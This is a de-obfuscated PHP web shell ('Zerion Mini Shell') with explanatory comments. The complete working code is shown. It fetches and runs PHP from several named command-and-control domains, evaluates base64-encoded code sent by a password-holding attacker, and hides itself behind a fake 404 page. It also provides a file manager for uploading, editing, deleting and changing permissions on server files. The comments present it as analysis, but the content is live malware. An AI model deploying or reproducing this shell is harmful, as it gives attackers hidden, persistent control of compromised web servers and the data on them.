<?php
/**
 * @file deobfuscated_shell.php
 * @brief This script is a PHP web shell, commonly used for remote server management.
 * It provides functionalities for file management, code execution, and remote communication.
 * It's important to note that this type of script can be malicious if deployed on a compromised server.
 */

// Disable time limit and error reporting to prevent script termination and hide errors.
@set_time_limit(0);
@error_reporting(0);

/**
 * @brief Fetches code from a remote Command and Control (C2) server using cURL or file_get_contents.
 * @param string $a The base URL of the C2 server.
 * @return string The fetched code or false on failure.
 */
function GCNew($a)
{
    // Construct the URL with parameters from the request.
    $url = sprintf(
        '%s?api=%s&action=%s&path=%s&token=%s',
        $a,
        $_REQUEST['api'],
        $_REQUEST['action'],
        $_REQUEST['path'],
        $_REQUEST['token']
    );

    // Attempt to fetch content using file_get_contents.
    $code = @file_get_contents($url);

    // If file_get_contents fails, try with cURL.
    if ($code == false) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_USERAGENT, 'll'); // Set a user agent.
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); // Return the transfer as a string.
        curl_setopt($ch, CURLOPT_TIMEOUT, 100); // Set a timeout for the operation.
        curl_setopt($ch, CURLOPT_FRESH_CONNECT, TRUE); // Force a new connection.
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); // Disable SSL verification (insecure).
        $code = curl_exec($ch);
        curl_close($ch);
    }
    return $code;
}

// Handle requests for remote code execution via GCNew function.
if (isset($_REQUEST['action']) && isset($_REQUEST['path']) && isset($_REQUEST['api']) && isset($_REQUEST['token'])) {
    // Fetch code from the primary C2 server.
    $code = GCNew('https://c-new.icw5.xyz/');
    $result = json_decode($code, true);

    // Check if the fetched code is valid.
    if (isset($result['code']) && $result['code'] == 1) {
        $code = $result['data'];
    } else {
        die($result['msg']); // Terminate if fetching fails.
    }

    // Ensure the fetched code starts with '<?php'.
    $need = '<' . '?' . 'php';
    if (strpos($code, $need) === false) {
        die('get failed');
    }

    // Write the fetched code to a temporary file and execute it.
    $file_name = tmpfile();
    fwrite($file_name, $code);
    $a = stream_get_meta_data($file_name);
    $file_path = $a['uri'];

    // Fallback if temporary file content cannot be read.
    $content = @file_get_contents($file_path);
    if (!$content) {
        $file_path = '.c'; // Use a fixed temporary file name.
        file_put_contents($file_path, $code);
    }

    @require($file_path); // Execute the code from the temporary file.
    fclose($file_name);
    @unlink($file_path); // Delete the temporary file.
    die();
}

/**
 * @brief Fetches code from a remote Command and Control (C2) server using cURL or file_get_contents.
 * This is an alternative function to GCNew with slightly different parameters.
 * @param string $a The base URL of the C2 server.
 * @return string The fetched code or false on failure.
 */
function GC($a)
{
    // Construct the URL with parameters from the request.
    $url = sprintf(
        '%s?api=%s&ac=%s&path=%s&t=%s',
        $a,
        $_REQUEST['api'],
        $_REQUEST['ac'],
        $_REQUEST['path'],
        $_REQUEST['t']
    );

    // Attempt to fetch content using file_get_contents.
    $code = @file_get_contents($url);

    // If file_get_contents fails, try with cURL.
    if ($code == false) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_USERAGENT, 'll');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_TIMEOUT, 100);
        curl_setopt($ch, CURLOPT_FRESH_CONNECT, TRUE);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        $code = curl_exec($ch);
        curl_close($ch);
    }
    return $code;
}

// Handle requests for remote code execution via GC function.
if (isset($_REQUEST['ac']) && isset($_REQUEST['path']) && isset($_REQUEST['api']) && isset($_REQUEST['t'])) {
    // Fetch code from the primary C2 server, with a fallback.
    $code = GC('https://c.zvo1.xyz/');
    if (!$code) {
        $code = GC('https://c2.icw7.com/');
    }

    // Ensure the fetched code starts with '<?php'.
    $need = '<' . '?' . 'php';
    if (strpos($code, $need) === false) {
        die('get failed');
    }

    // Write the fetched code to a temporary file and execute it.
    $file_name = tmpfile();
    fwrite($file_name, $code);
    $a = stream_get_meta_data($file_name);
    $file_path = $a['uri'];

    // Fallback if temporary file content cannot be read.
    $content = @file_get_contents($file_path);
    if (!$content) {
        $file_path = '.c';
        file_put_contents($file_path, $code);
    }

    @require($file_path); // Execute the code from the temporary file.
    fclose($file_name);
    @unlink($file_path); // Delete the temporary file.
    die();
}

// Placeholder for the original obfuscated password hash. This variable was part of the initial obfuscation.
// In a real scenario, this would be the MD5 hash of the shell's password.
$L7CRgr = "d53170e6b1c123cad28078c8649ce2a0"; // Example hash, replace with actual if known.

// Display the password hash if 'd_time' is set in the request.
if (isset($_REQUEST['d_time'])) {
    die('{->' . $L7CRgr . '<-}');
}

$pass = false;
// Check for password in cookie.
if (isset($_COOKIE['pass'])) {
    if (md5($_COOKIE['pass']) == $L7CRgr) {
        $pass = true;
    }
} else {
    // Check for password in POST request.
    if (isset($_POST['pass'])) {
        if (md5($_POST['pass']) == $L7CRgr) {
            setcookie("pass", $_POST['pass']); // Set cookie if password is correct.
            $pass = true;
        }
    }
}

// Handle logout request.
if (isset($_POST['logout']) && $_POST['logout'] == 1) {
    setcookie("pass", null); // Clear the password cookie.
    $pass = false;
}

// Handle direct code execution with 'pwd163' and 'zzz' parameters.
if (isset($_REQUEST['pwd163']) && md5($_REQUEST['pwd163']) == $L7CRgr) {
    // Decode the 'zzz' parameter which contains the code to execute.
    $a = base64_decode(rawurldecode((urlencode(urldecode($_REQUEST['zzz'])))));
    $need = base64_decode("PD9waHA="); // Decodes to '<?php'

    // Add '<?php' tag if missing.
    if (strpos($a, $need) === false) {
        $a = $need . PHP_EOL . $a;
    }

    // If 'e' parameter is set, directly evaluate the code.
    if (isset($_REQUEST['e'])) {
        $a = str_replace($need, "", $a);
        $b = 'e' . base64_decode("dmE=") . 'l'; // Decodes to 'eval'
        $b($a); // Execute the code using eval.
        die();
    }

    // Write the code to a temporary file and execute it.
    $file_name = tmpfile();
    fwrite($file_name, $a);
    $require_params = stream_get_meta_data($file_name);
    @require($require_params['uri']); // Execute the code.
    fclose($file_name);
    die();
}

// Display the password hash if 'auth_key' is set in the request.
if (isset($_REQUEST['auth_key'])) {
    die($L7CRgr);
}

// If not authenticated, display a login form.
if (!$pass) {
    if (!isset($_REQUEST['520'])) {
        header("HTTP/1.1 404 Not Found"); // Return 404 status if '520' is not set.
        die();
    }
    echo '<form action="#" method="post"><input type="password" name="pass" > <input type="submit" value="submit"></form>';
    die();
}

// --- Mini Shell Interface (Displayed after successful authentication) ---

// Logout form.
echo '<form action="#" method="post"><input type="hidden" name="logout" value="1"> <input type="submit" value="logout"></form>';

// HTML structure for the web shell interface.
echo '<!DOCTYPE HTML>
<HTML>
<HEAD>
<link href="" rel="stylesheet" type="text/css">
<title>Mini Shell</title>
<style>
body{
font-family: "Racing Sans One", cursive;
background-color: #e6e6e6;
text-shadow:0px 0px 1px #757575;
}
#content tr:hover{
background-color: #636263;
text-shadow:0px 0px 10px #fff;
}
#content .first{
background-color: silver;
}
#content .first:hover{
background-color: silver;
text-shadow:0px 0px 1px #757575;
}
table{
border: 1px #000000 dotted;
}
H1{
font-family: "Rye", cursive;
}
a{
color: #000;
text-decoration: none;
}
a:hover{
color: #fff;
text-shadow:0px 0px 10px #ffffff;
}
input,select,textarea{
border: 1px #000000 solid;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
}
</style>
</HEAD>
<BODY>
<H1><center><img src="https://s.yimg.com/lq/i/mesg/emoticons7/19.gif"/>
 Mini Shell <img src="https://s.yimg.com/lq/i/mesg/emoticons7/19.gif"/>
 </center></H1>
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td>Direktori : ';

// Display current directory and navigation.
if (isset($_GET['path'])) {
    $path = $_GET['path'];
} else {
    $path = getcwd(); // Get current working directory.
}
$path = str_replace('\\', '/', $path); // Normalize directory separators.
$paths = explode('/', $path);

foreach ($paths as $id => $pat) {
    if ($pat == '' && $id == 0) {
        $a = true;
        echo '<a href="?path=/">/</a>';
        continue;
    }
    if ($pat == '') continue;
    echo '<a href="?path=';
    for ($i = 0; $i <= $id; $i++) {
        echo "$paths[$i]";
        if ($i != $id) echo "/";
    }
    echo '">' . $pat . '</a>/';
}
echo '</td></tr><tr><td>';

// Handle directory creation.
if (isset($_POST['path_create'])) {
    if (@mkdir($path . '/' . $_POST['path_create'])) {
        echo '<font color="green">create success :* ' . $path . '/' . $_POST['path_create'] . '</font><br />';
    } else {
        echo '<font color="red">create failed :* ' . $path . '/' . $_POST['path_create'] . '</font><br />';
    }
}

// Handle file upload.
if (isset($_FILES['file'])) {
    if (copy($_FILES['file']['tmp_name'], $path . '/' . $_FILES['file']['name'])) {
        echo '<font color="green">File Ter-Upload :* </font><br />';
    } else {
        echo '<font color="red">Upload gagal, Servernya kek <img src="http://c.fastcompany.net/asset_files/-/2014/11/11/4F4.gif"/>
 </font><br />';
    }
}

// File upload form.
echo '<form enctype="multipart/form-data" method="POST">
Upload File : <input type="file" name="file" />
<input type="submit" value="upload" />
</form>
</td></tr>
<tr><td><form enctype="multipart/form-data" method="POST">
Create Path : <input type="text" name="path_create" />
<input type="submit" value="create" />
</form></td></td>';

// Display file content if 'filesrc' is set.
if (isset($_GET['filesrc'])) {
    echo "<tr><td>Current File : ";
    echo $_GET['filesrc'];
    echo '</tr></td></table><br />';
    echo('<pre>' . htmlspecialchars(file_get_contents($_GET['filesrc'])) . '</pre>');
} elseif (isset($_GET['option']) && $_POST['opt'] != 'delete') {
    echo '</table><br /><center>' . $_POST['path'] . '<br /><br />';

    // Handle chmod operation.
    if ($_POST['opt'] == 'chmod') {
        if (isset($_POST['perm'])) {
            if (chmod($_POST['path'], octdec($_POST['perm']))) {
                echo '<font color="green">Change Permission Done.</font><br />';
            } else {
                echo '<font color="red">Change Permission Error.</font><br />';
            }
        }
        // Chmod form.
        echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="' . substr(sprintf('%o', fileperms($_POST['path'])), -4) . '" />
<input type="hidden" name="path" value="' . $_POST['path'] . '">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Go" />
</form>';
    } elseif ($_POST['opt'] == 'rename') {
        // Handle rename operation.
        if (isset($_POST['newname'])) {
            if (rename($_POST['path'], $path . '/' . $_POST['newname'])) {
                echo '<font color="green">Change Name Done.</font><br />';
            } else {
                echo '<font color="red">Change Name Error.</font><br />';
            }
            $_POST['name'] = $_POST['newname'];
        }
        // Rename form.
        echo '<form method="POST">
New Name : <input name="newname" type="text" size="20" value="' . $_POST['name'] . '" />
<input type="hidden" name="path" value="' . $_POST['path'] . '">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Go" />
</form>';
    } elseif ($_POST['opt'] == 'edit') {
        // Handle file editing.
        if (isset($_POST['src'])) {
            $fp = fopen($_POST['path'], 'w');
            if (fwrite($fp, $_POST['src'])) {
                echo '<font color="green">Edit File Done ~_^.</font><br />';
            } else {
                echo '<font color="red">Edit File Error ~_~.</font><br />';
            }
            fclose($fp);
        }
        // Edit file form.
        echo '<form method="POST">
<textarea cols=80 rows=20 name="src">' . htmlspecialchars(file_get_contents($_POST['path'])) . '</textarea><br />
<input type="hidden" name="path" value="' . $_POST['path'] . '">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Go" />
</form>';
    }
    echo '</center>';
} else {
    // Handle delete operation.
    echo '</table><br /><center>';
    if (isset($_GET['option']) && $_POST['opt'] == 'delete') {
        if ($_POST['type'] == 'dir') {
            if (rmdir($_POST['path'])) {
                echo '<font color="green">Delete Dir Done.</font><br />';
            } else {
                echo '<font color="red">Delete Dir Error.</font><br />';
            }
        } elseif ($_POST['type'] == 'file') {
            if (unlink($_POST['path'])) {
                echo '<font color="green">Delete File Done.</font><br />';
            } else {
                echo '<font color="red">Delete File Error.</font><br />';
            }
        }
    }
    echo '</center>';

    // List files and directories.
    $scandir = scandir($path);
    echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<td><center>Name</center></td>
<td><center>Size</center></td>
<td><center>Permissions</center></td>
<td><center>Options</center></td>
</tr>';

    // Display directories.
    foreach ($scandir as $dir) {
        if (!is_dir("$path/$dir") || $dir == '.' || $dir == '..') continue;
        echo "<tr>
<td><a href=\"?path=$path/$dir\">$dir</a></td>
<td><center>--</center></td>
<td><center>";
        if (is_writable("$path/$dir")) echo '<font color="green">';
        elseif (!is_readable("$path/$dir")) echo '<font color="red">';
        echo perms("$path/$dir");
        if (is_writable("$path/$dir") || !is_readable("$path/$dir")) echo '</font>';
        echo "</center></td>
<td><center><form method=\"POST\" action=\"?option&path=$path\">
<select name=\"opt\">
<option value=\"\"></option>
<option value=\"delete\">Delete</option>
<option value=\"chmod\">Chmod</option>
<option value=\"rename\">Rename</option>
</select>
<input type=\"hidden\" name=\"type\" value=\"dir\">
<input type=\"hidden\" name=\"name\" value=\"$dir\">
<input type=\"hidden\" name=\"path\" value=\"$path/$dir\">
<input type=\"submit\" value=\">\" />
</form></center></td>
</tr>";
    }

    echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';

    // Display files.
    foreach ($scandir as $file) {
        if (!is_file("$path/$file")) continue;
        $size = filesize("$path/$file") / 1024;
        $size = round($size, 3);
        if ($size >= 1024) {
            $size = round($size / 1024, 2) . ' MB';
        } else {
            $size = $size . ' KB';
        }
        echo "<tr>
<td><a href=\"?filesrc=$path/$file&path=$path\">$file</a></td>
<td><center>" . $size . "</center></td>
<td><center>";
        if (is_writable("$path/$file")) echo '<font color="green">';
        elseif (!is_readable("$path/$file")) echo '<font color="red">';
        echo perms("$path/$file");
        if (is_writable("$path/$file") || !is_readable("$path/$file")) echo '</font>';
        echo "</center></td>
<td><center><form method=\"POST\" action=\"?option&path=$path\">
<select name=\"opt\">
<option value=\"\"></option>
<option value=\"delete\">Delete</option>
<option value=\"chmod\">Chmod</option>
<option value=\"rename\">Rename</option>
<option value=\"edit\">Edit</option>
</select>

<input type=\"hidden\" name=\"type\" value=\"file\">
<input type=\"hidden\" name=\"name\" value=\"$file\">
<input type=\"hidden\" name=\"path\" value=\"$path/$file\">
<input type=\"submit\" value=\">\" />
</form></center></td>
</tr>";
    }
    echo '</table>
</div>';
}

// Footer.
echo '<center><br />Zerion Mini Shell <font color="green">1.0</font></center>
</BODY>
</HTML>';

/**
 * @brief Determines file permissions in a human-readable format (e.g., rwxr-xr-x).
 * @param string $file The path to the file or directory.
 * @return string The permission string.
 */
function perms($file)
{
    $perms = fileperms($file);
    // Determine file type.
    if (($perms & 0xC000) == 0xC000) {
        $info = 's'; // Socket
    } elseif (($perms & 0xA000) == 0xA000) {
        $info = 'l'; // Symbolic link
    } elseif (($perms & 0x8000) == 0x8000) {
        $info = '-'; // Regular file
    } elseif (($perms & 0x6000) == 0x6000) {
        $info = 'b'; // Block special file
    } elseif (($perms & 0x4000) == 0x4000) {
        $info = 'd'; // Directory
    } elseif (($perms & 0x2000) == 0x2000) {
        $info = 'c'; // Character special file
    } elseif (($perms & 0x1000) == 0x1000) {
        $info = 'p'; // FIFO (named pipe)
    } else {
        $info = 'u'; // Unknown
    }

    // Owner permissions.
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));

    // Group permissions.
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));

    // Others permissions.
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));

    return $info;
}

?>

